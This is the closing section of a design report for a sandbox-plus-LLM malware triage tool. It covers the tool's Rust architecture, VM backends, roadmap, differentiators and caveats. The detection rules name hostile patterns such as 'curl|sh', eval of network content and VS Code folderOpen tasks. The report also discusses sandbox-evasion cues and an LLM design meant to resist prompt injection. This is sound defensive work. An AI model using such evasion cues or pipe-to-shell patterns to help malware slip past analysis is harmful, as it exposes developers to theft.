- **Dual use.** A tool that reports "what tipped off the sandbox" helps attackers tune evasion. Keep evasion-detection details in the expert report, not marketing. The underlying capability (sandbox + LLM triage) is already public (Joe Sandbox, VirusTotal, open-source projects), so marginal uplift is low.

## Recommendations

### Recommended architecture (Rust)

```
issafe (single binary, host, trusted)
├─ input router: text | url | file | dir/repo | git url | package spec | shell cmd
├─ static workers (host, Landlock+seccomp / Seatbelt-confined, WASM where possible)
│   unpack (zip/tar/dmg/pkg/xar), file-type, YARA, secrets/IOC regex,
│   AST rules (tasks.json folderOpen, lifecycle hooks, curl|sh, eval-of-network)
├─ sandbox backend trait
│   ├─ Linux: libkrun (via microsandbox crates) on KVM  [fallback: Firecracker]
│   ├─ macOS: Virtualization.framework Linux guest (objc2/virt-fwk) [alt: libkrun-HVF, Apple `container`]
│   └─ macOS deep mode (opt-in): VZ macOS guest
├─ guest image: minimal Linux + node/python/git + Tetragon/strace + canary home + fake AI CLIs
├─ host-side network: none | fake-internet (DNS sinkhole + canned HTTP/TLS, full log) | live-recorded (opt-in)
├─ evidence compiler: telemetry + disk diff + net log -> typed evidence items with IDs
├─ agent: privileged planner (typed tools) + quarantined reader (no tools, schema output)
├─ rules floor + validator -> verdict {red, orange, yellow, none-found} + unchecked list
└─ renderers: terminal, --json, HTML report
```

**Backends.** On Linux, use libkrun. It is embeddable, daemonless, has a Rust SDK and the same code path as macOS. Harden the VMM process yourself (seccomp, unprivileged user, no host mounts), because the 2026 comparative study found libkrun applies none of these at defaults. Keep Firecracker as a "paranoid" backend. On macOS, use VZ directly for the Linux guest, because it is first-party, entitlement-gated and well understood. libkrun-HVF is acceptable if one codebase matters more.

**Model strategy.** Use a hosted frontier model with BYO key by default, a local model in `--private` mode, and identical deterministic floors in both. Budget tokens by analysing diffs and evidence summaries rather than whole packages (RAID 2025 found 16.86% of packages exceed context).

### Phased roadmap

1. **MVP (8-12 weeks).** Linux + Apple Silicon. Inputs: shell command / `curl|bash` URL, git repo or folder, npm/PyPI package. Offline + fake-internet detonation, canary home with fake AI CLIs, VS Code task simulation, evidence-cited verdicts, `doctor`, Homebrew/binstall.
2. **Phase 2.** URL/ClickFix analysis in an isolated browser VM with a Mac fingerprint and clipboard capture. Text-message lure scoring with domain/CT/RDAP lookups. Shell paste interception and a `git clone` guard. DMG/PKG static unpacking.
3. **Phase 3.** macOS-guest deep mode for AMOS-class samples, live-recorded egress, documents (Dangerzone-style render-to-pixels plus macro/OLE/PDF-JS analysis), a menu-bar/Share-sheet app and browser extension, and optional cloud deep scan for Windows PE.
4. **Continuous.** A regression corpus of real lures (public Contagious Interview repos, Shai-Hulud samples, ClickFix one-liners, benign look-alikes) scored on every release. Publish recall *and* false-positive rates honestly.

### Candidate differentiators

- **"Open it like a victim would"** simulation for repos (IDE tasks, install, start, import), which existing package scanners don't do.
- **Canary home with fake AI CLIs and wallets**, turning stealer behaviour into near-conclusive evidence.
- **A paste guard** for ClickFix at the moment of harm.
- **Private by default**, without the public-submission problem of free cloud sandboxes.
- **Evidence-cited, never-"safe" verdicts** that resist narrative prompt injection.

### Is it worth building?

Yes, for the developer/crypto-adjacent audience, where the threat is documented, high-impact and underserved, and where you can win on trust (open source, local) and on a workflow nobody else owns (vet before you clone, install or paste). It is not worth leading with generic consumer text-scam checking, where Scamio and Genie are free and embedded in messaging apps. Expect the hardest problems to be guest realism against VM checks, keeping cold start fast, and macOS distribution (entitlement, notarisation, IPSW size), not the LLM.

## Caveats

- Several figures come from secondary write-ups rather than primary reports: the 2,349/1,079 s1ngularity figures via GitGuardian as relayed, the Shai-Hulud 2.0 package count via an arXiv survey citing Datadog, and the ClickFix "half of loader activity" claim. Some competitor details (vetsh, allsmog/detonate, Norton Genie's ChatGPT/Claude connector) come from README snippets or third-party pages that could not be fully verified.
- The microsandbox <100 ms boot and Apple `container` sub-second boot figures are project claims, not independent benchmarks. The libkrun risk assessment comes from a single 2026 study.
- LLM detection benchmarks vary widely by dataset and are likely optimistic for evasive, in-the-wild samples. The ALIBI result suggests published accuracy may not hold against adversaries who target the analyser.
- Model-provider usage-policy treatment of malware analysis was not verified for this report and can change; build refusal handling in from day one.
- Performance targets in the UX section are design goals, not measurements.
